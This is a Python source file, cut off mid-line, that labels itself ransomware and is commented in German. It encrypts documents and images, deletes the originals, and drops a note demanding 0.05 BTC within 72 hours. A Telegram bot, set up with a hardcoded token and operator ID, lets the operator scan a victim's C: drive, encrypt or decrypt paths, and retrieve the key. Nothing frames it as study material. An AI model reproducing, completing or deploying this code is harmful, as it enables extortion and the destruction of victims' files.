#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
files_sperren.py - Dateiverschlüsselung (Ransomware)
"""

import os
import sys
import json
import base64
import hashlib
from cryptography.fernet import Fernet
import telebot
from telebot import types
import threading
import time

BOT_TOKEN = "8746163440:AAFbrUUlkEal0eidxekyBH1yrDREow4JtEo"
MASTER_ID = "6976176725"
CRYPTO_ADDRESS = "HIER_DEINE_BITCOIN_ADRESSE"
AMOUNT = "0.05"
EMAIL = "deine_email@example.com"

bot = telebot.TeleBot(BOT_TOKEN)
encryption_key = Fernet.generate_key()
cipher = Fernet(encryption_key)

def encrypt_file(filepath):
    try:
        with open(filepath, 'rb') as f:
            data = f.read()
        
        encrypted = cipher.encrypt(data)
        
        with open(filepath + '.locked', 'wb') as f:
            f.write(encrypted)
        
        os.remove(filepath)
        return True
    except:
        return False

def decrypt_file(filepath, key):
    try:
        cipher_local = Fernet(key)
        with open(filepath, 'rb') as f:
            encrypted = f.read()
        
        decrypted = cipher_local.decrypt(encrypted)
        
        original_name = filepath.replace('.locked', '')
        with open(original_name, 'wb') as f:
            f.write(decrypted)
        
        os.remove(filepath)
        return True
    except:
        return False

def scan_and_encrypt(path, extensions=['.txt', '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.jpg', '.png']):
    encrypted_count = 0
    for root, dirs, files in os.walk(path):
        for file in files:
            if any(file.endswith(ext) for ext in extensions):
                filepath = os.path.join(root, file)
                if encrypt_file(filepath):
                    encrypted_count += 1
    return encrypted_count

def create_ransom_note(path):
    note = f"""
    ⚠️ DEINE DATEIEN WURDEN VERSCHLÜSSELT! ⚠️
    
    Um Ihre Dateien zurückzubekommen:
    
    1. Senden Sie {AMOUNT} BTC an:
       {CRYPTO_ADDRESS}
    
    2. Senden Sie den Zahlungsnachweis an:
       {EMAIL}
    
    3. Sie erhalten den Entschlüsselungsschlüssel
    
    Zeitlimit: 72 Stunden
    """
    
    with open(os.path.join(path, 'READ_ME.txt'), 'w', encoding='utf-8') as f:
        f.write(note)

@bot.message_handler(commands=['start'])
def send_welcome(message):
    if str(message.chat.id) != MASTER_ID:
        return
    
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    btn1 = types.KeyboardButton('🔍 Scan for files')
    btn2 = types.KeyboardButton('🔒 Encrypt files')
    btn3 = types.KeyboardButton('🔓 Decrypt files')
    btn4 = types.KeyboardButton('📝 Create ransom note')
    btn5 = types.KeyboardButton('🗝️ Get encryption key')
    markup.add(btn1, btn2, btn3, btn4, btn5)
    
    bot.send_message(message.chat.id,
                    "🔐 **FILE ENCRYPTION BOT** 🔐\n"
                    f"Key: {encryption_key[:20]}...",
                    parse_mode='Markdown',
                    reply_markup=markup)

@bot.message_handler(func=lambda message: True)
def handle_messages(message):
    if str(message.chat.id) != MASTER_ID:
        return
    
    text = message.text
    
    if text == '🔍 Scan for files':
        count = 0
        for root, dirs, files in os.walk('C:\\'):
            count += len([f for f in files if f.endswith(('.txt', '.pdf', '.docx'))])
            if count > 1000:
                break
        bot.send_message(message.chat.id, f"📊 Gefunden: {count} verschlüsselbare Dateien")
    
    elif text == '🔒 Encrypt files':
        msg = bot.send_message(message.chat.id, "Gib Pfad zum Verschlüsseln (z.B. C:\\Users):")
        bot.register_next_step_handler(msg, process_encryption)
    
    elif text == '🔓 Decrypt files':
        msg = bot.send_message(message.chat.id, "Gib Entschlüsselungsschlüssel:")
        bot.register_next_step_handler(msg, process_decryption)
    
    elif text == '📝 Create ransom note':
        create_ransom_n
